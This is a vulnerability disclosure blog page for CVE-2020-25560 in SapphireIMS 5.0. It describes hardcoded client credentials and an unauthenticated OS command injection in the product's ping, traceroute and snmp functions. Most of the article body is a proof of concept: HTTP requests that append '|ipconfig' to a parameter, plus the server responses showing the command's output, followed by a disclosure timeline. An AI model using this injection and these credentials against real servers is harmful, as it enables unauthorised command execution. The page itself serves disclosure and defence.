
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>[CVE-2020-25560] SapphireIMS: Unauthenticated remote command execution on server | Vulnerability Disclosure</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="DescriptionIn SapphireIMS 5.0, it is possible to use the hardcoded credential in clients (username: sapphire, password: ims) and gain access to the portal. Once the access is available, the attacker c">
<meta property="og:type" content="article">
<meta property="og:title" content="[CVE-2020-25560] SapphireIMS: Unauthenticated remote command execution on server">
<meta property="og:url" content="https://vuln.shellcoder.party/2020/09/19/CVE-2020-25560-SapphireIMS-Unauthenticated-remote-command-execution-on-server/index.html">
<meta property="og:site_name" content="Vulnerability Disclosure">
<meta property="og:description" content="DescriptionIn SapphireIMS 5.0, it is possible to use the hardcoded credential in clients (username: sapphire, password: ims) and gain access to the portal. Once the access is available, the attacker c">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-09-19T23:25:12.000Z">
<meta property="article:modified_time" content="2020-09-26T12:22:04.494Z">
<meta property="article:author" content="Tanoy Bose">
<meta property="article:tag" content="SapphireIMS">
<meta property="article:tag" content="Web application">
<meta property="article:tag" content="CVE-2020-25560">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  
	<!-- If needed, replace your own web font service -->
  <link href="https://fonts.googleapis.com/css?family=Crimson+Text:400,700|Inconsolata|Oswald" rel="stylesheet" />

  
   
  
<link rel="stylesheet" href="/icomoon/style.css">

  
<link rel="stylesheet" href="/style.css">


<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div class="site-wrapper is_post_page">
    <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>
<script>document.getElementById("loading-bar").style.width="20%";</script>


<header id="header" class="site-header clearfix">

  <a class="logo square clearfix" href="/">
    <!-- 
      Replace with your own size name, for example:
      <span class="b">A</span>
      <span class="w">B</span>
      <span class="b">C</span>
     <span class="b">V</span>
     <span class="b">U</span>
     <span class="b">L</span>
     <span class="w">N</span>
     <span class="w">E</span>
     <span class="b">R</span>
     <span class="b">A</span>
     <span class="b">B</span>
     <span class="b">I</span>
     <span class="b">L</span>
     <span class="b">I</span>
     <span class="b">T</span>
     <span class="b">Y</span>
     <span class="w">-</span>
     <span class="b">D</span>
     <span class="b">I</span>
     <span class="b">S</span>
     <span class="w">C</span>
     <span class="w">L</span>
     <span class="b">O</span>
     <span class="b">S</span>
     <span class="b">U</span>
     <span class="b">R</span>
     <span class="b">E</span>
     <span class="b">S</span>
     -->
     <span class="b">0</span>
     <span class="w">-</span>
     <span class="b">D</span>
     <span class="b">A</span>
     <span class="b">Y</span>
     <span class="b">S</span>
  </a>
  <a class="me square site-nav-switch clearfix">
    <span class="b">
    	<span class="icon icon-menu"></span>
    </span>
  </a>

</header>

    <script>document.getElementById("loading-bar").style.width="40%";</script>
    <main id="main" class="clearfix">
      <article id="post-CVE-2020-25560-SapphireIMS-Unauthenticated-remote-command-execution-on-server"
  class="article white-box article-type-post"
  itemscope itemprop="blogPost">

  <header class="article-header">
    <h1 class="article-title" itemprop="name">
      [CVE-2020-25560] SapphireIMS: Unauthenticated remote command execution on server
    </h1>
    <div class="article-meta">
      Posted on 
      <time class="article-time" datetime="2020-09-19T23:25:12.000Z" itemprop="datePublished">
        Sep 19, 2020
      </time>
    </div>
  </header>

  <div class="article-entry" itemprop="articleBody">
    <h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>In SapphireIMS 5.0, it is possible to use the hardcoded credential in clients (username: sapphire, password: ims) and gain access to the portal. Once the access is available, the attacker can inject malicious OS commands on “ping”, “traceroute” and “snmp” functions and execute code on the server. We also observed the same is true if the JSESSIONID is completely removed.</p>
<h1 id="CVSS-3-0-Base-Score"><a href="#CVSS-3-0-Base-Score" class="headerlink" title="CVSS 3.0 Base Score"></a>CVSS 3.0 Base Score</h1><p>10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)</p>
<h1 id="Researcher"><a href="#Researcher" class="headerlink" title="Researcher"></a>Researcher</h1><p>Tanoy Bose</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>Note, in the current POC, we have not utilized JSESSIONID.</p>
<h2 id="Request-Command-Exec"><a href="#Request-Command-Exec" class="headerlink" title="Request (Command Exec)"></a>Request (Command Exec)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;SapphireIMS&#x2F;CmdProcess?hostorip&#x3D;127.0.0.1&amp;pagefrom&#x3D;Ping&amp;param1&#x3D;1000&amp;param2&#x3D;4&amp;param3&#x3D;32|ipconfig HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.191.48</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
<h2 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: Apache-Coyote&#x2F;1.1</span><br><span class="line">Location: http:&#x2F;&#x2F;192.168.191.48&#x2F;SapphireIMS&#x2F;.&#x2F;RunCmd.jsp?pagefrom&#x3D;Ping</span><br><span class="line">Cookie: JSESSIONID&#x3D;Ni+9V4wVLLkXCe5J0mirr2XX</span><br><span class="line">Content-Length: 0</span><br><span class="line">Date: Wed, 16 Sep 2020 20:51:49 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>For checking the output of the command, use the JSESSIONID of the above response in the below request.</p>
<h2 id="Request-to-Read-executed-command-status"><a href="#Request-to-Read-executed-command-status" class="headerlink" title="Request (to Read executed command status)"></a>Request (to Read executed command status)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;SapphireIMS&#x2F;PortletClass HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.191.48</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0</span><br><span class="line">Accept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">X-Prototype-Version: 1.6.0.3</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 9</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.191.48</span><br><span class="line">Cookie: JSESSIONID&#x3D;Ni+9V4wVLLkXCe5J0mirr2XX</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.191.48&#x2F;SapphireIMS&#x2F;RunCmd.jsp?pagefrom&#x3D;Ping</span><br><span class="line"></span><br><span class="line">make&#x3D;Ping</span><br></pre></td></tr></table></figure>
<h2 id="Response-1"><a href="#Response-1" class="headerlink" title="Response"></a>Response</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: Apache-Coyote&#x2F;1.1</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Type: text&#x2F;xml;charset&#x3D;UTF-8</span><br><span class="line">Date: Wed, 16 Sep 2020 20:51:51 GMT</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">&lt;tr&gt;&lt;td class&#x3D;&quot;gen&quot;&gt;&lt;textarea  id&#x3D;&quot;desc&quot; name&#x3D;&quot;desc&quot; cols&#x3D;&quot;100&quot; rows&#x3D;&quot;22&quot; class&#x3D;&quot;gen&quot; readonly&gt;    Windows IP Configuration</span><br><span class="line">       Host Name . . . . . . . . . . . . : WinDev2008Eval</span><br><span class="line">       Primary Dns Suffix  . . . . . . . : </span><br><span class="line">       Node Type . . . . . . . . . . . . : Mixed</span><br><span class="line">       IP Routing Enabled. . . . . . . . : No</span><br><span class="line">       WINS Proxy Enabled. . . . . . . . : No</span><br><span class="line">    Ethernet adapter Ethernet:</span><br><span class="line">       Connection-specific DNS Suffix  . : </span><br><span class="line">       Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter</span><br><span class="line">       Physical Address. . . . . . . . . : 00-15-5D-00-AF-27</span><br><span class="line">       DHCP Enabled. . . . . . . . . . . : Yes</span><br><span class="line">       Autoconfiguration Enabled . . . . : Yes</span><br><span class="line">       Link-local IPv6 Address . . . . . : fe80::1082:834f:7792:5e65%7(Preferred) </span><br><span class="line">       IPv4 Address. . . . . . . . . . . : 192.168.1.109 (Preferred) </span><br><span class="line">       Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">       Lease Obtained. . . . . . . . . . : Wednesday, September 16, 2020 12:42:55 PM</span><br><span class="line">       Lease Expires . . . . . . . . . . : Thursday, September 17, 2020 12:42:55 PM</span><br><span class="line">       Default Gateway . . . . . . . . . : 192.168.1.1</span><br><span class="line">       DHCP Server . . . . . . . . . . . : 192.168.1.1</span><br><span class="line">       DHCPv6 IAID . . . . . . . . . . . : 83891549</span><br><span class="line">       DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-F4-1C-CA-00-15-5D-00-AF-27</span><br><span class="line">       DNS Servers . . . . . . . . . . . : 192.168.1.1</span><br><span class="line">       NetBIOS over Tcpip. . . . . . . . : Enabled</span><br><span class="line">Wed Sep 16 13:48:59 PDT 2020</span><br><span class="line">Action Completed</span><br><span class="line">&lt;&#x2F;textarea&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gen&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;Finish&quot; onClick&#x3D;&quot;go_back()&quot; name&#x3D;&quot;finishedbutton&quot; id&#x3D;&quot;finishedbutton&quot; class&#x3D;&quot;domains&quot;&#x2F;&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;</span><br></pre></td></tr></table></figure>


<h1 id="Vulnerability-Tracker"><a href="#Vulnerability-Tracker" class="headerlink" title="Vulnerability Tracker"></a>Vulnerability Tracker</h1><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25560" target="_blank" rel="noopener">CVE-2020-25560</a></li>
</ul>
<h1 id="Disclosure-timelines"><a href="#Disclosure-timelines" class="headerlink" title="Disclosure timelines"></a>Disclosure timelines</h1><ul>
<li>07 May, 2020 - Vendor informed; failed</li>
<li>16 Sept, 2020 - Cert-CC and Cert-In Informed</li>
</ul>

  </div>
  
  <div class="article-tags">
    
      <a class="tag-link" href="/tags/CVE-2020-25560/" rel="tag">CVE-2020-25560</a><a class="tag-link" href="/tags/SapphireIMS/" rel="tag">SapphireIMS</a><a class="tag-link" href="/tags/Web-application/" rel="tag">Web application</a>
    
  </div>

  

</article>

      <script>document.getElementById("loading-bar").style.width="60%";</script>
    </main>
    
<footer id="footer" class="clearfix">
	
	<div class="search">
	  <form name="searchform" id="searchform" class="u-search-form">
	    <input type="text" id="searchinput" 
				class="u-search-input st-default-search-input"
				data-list-highlight="true" 
				data-list-value-completion="true" 
				placeholder="Looking for something?" />
	    <button type="submit" id="u-search-btn-submit" class="u-search-btn-submit">
	      <span class="icon icon-search"></span>
	    </button>
	  </form>
	</div>
	
  <div>&copy; <a href="https://vuln.shellcoder.party">Vulnerability Disclosure</a> by <a href="https://shellcoder.party" target="_blank" rel="noopener">Tanoy Bose</a>; Theme by <a href="http://artifact.me/" target="_blank">Art Chen</a>.</div>
  <div>Powered by <a href="https://hexo.io/" target="_blank" rel="external noopener">Hexo</a>.</div>
</footer>


    <script>document.getElementById("loading-bar").style.width="80%";</script>
    <div class="overlay"></div>
  </div>
  <div class="site-sidebar">

	
	
	<div class="sidebar-switch clearfix "
		style="display: none">
		<a class="dark-btn active" data-toggle="toc">
	    <span class="icon icon-list"></span>
	    <span class="text">Index</span>
	  </a>
	  <a class="dark-btn" data-toggle="bio">
	    <span class="icon icon-person"></span>
	    <span class="text">Bio</span>
	  </a>
	</div>

	<div class="site-toc "
		style="display: none">
		
	    <div class="no-index">No Index</div>
	  
  </div>
  
	<div class="site-bio show"
		style="display: block">
		
	  <!-- About Me -->
	  <div class="about-me clearfix">
	    <div class="avatar">
	      <img src="/img/avatar.jpg" />
	    </div>
	    <div class="info">
	      <!-- <a class="name dark-btn" href="/about"> -->
	      <a class="name dark-btn" href="http://shellcoder.party" target="_blank" rel="noopener">
	        Tanoy Bose
	      </a>
	    </div>
	    <div class="info">
	      <span class="item desc">
	        Namaste.<br>You can know about me at my <a href="https://shellcoder.party" style="color:#ffffff" target="_blank">portfolio</a>.<br>I follow my own <a href="/2020/09/19/vulnerability-disclosure-policy/" style="color:#ffffff"> Vulnerability Disclosure Policy</a>.<br>Most of my work is listed <a href="https://repo.shellcoder.party" style="color:#ffffff" target="_blank">here</a>.
	      </span>
	    </div>
	  </div>
	
	  <!-- Social Icons -->
	  <div class="social clearfix">
	    
	      
	        <a href="/atom.xml" class="feed"
	          target="_blank" rel="external">
	          <span class="icon icon-feed"></span>
	        </a>
	      
	        <a href="/cve@shellcoder.party" class="email"
	          target="_blank" rel="external">
	          <span class="icon icon-email"></span>
	        </a>
	      
	        <a href="https://github.com/n0tty" class="github"
	          target="_blank" rel="external">
	          <span class="icon icon-github"></span>
	        </a>
	      
	        <a href="https://twitter.com/TanoyBose" class="twitter"
	          target="_blank" rel="external">
	          <span class="icon icon-twitter"></span>
	        </a>
	      
	        <a href="https://linkedin.com/in/tanoybose" class="linkedin"
	          target="_blank" rel="external">
	          <span class="icon icon-linkedin"></span>
	        </a>
	      
	    
	  </div>

	</div>

	<div class="shortcuts">
		<a href="#header" class="top window-nav dark-btn" id="go-top">
			<span class="icon icon-chevron-thin-up"></span>
		</a>
		<a class="close dark-btn" id="sidebar-close">
			<span class="icon icon-close"></span>
		</a>
		<a href="#footer" class="top window-nav dark-btn" id="go-bottom">
			<span class="icon icon-chevron-thin-down"></span>
		</a>
	</div>

</div>

  <!-- Universal Search -->

<script type="text/javascript">
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "AIzaSyCBDLDVabwj4C6zhzbhxdKVNUrDG5xKR-8";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "aefb6b3d52745e73f";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var BAIDU_API_ID = "";
  var SEARCH_SERVICE = "google";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.js"><\/script>')</script>


<script src="/js/search.js"></script>


<script src="/js/app.js"></script>


<!-- Disqus -->



<!-- Valine -->


<!-- Swiftype -->
<!-- Please replace with your own swiftype settings -->
<!--
<script type="text/javascript">
  /* Swiftype */
  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

  _st('install','FHMeAyBdVccJECstf-XJ','2.0.0');
</script>
-->

  <script>document.getElementById("loading-bar").style.width="100%";</script>
</body>
</html>
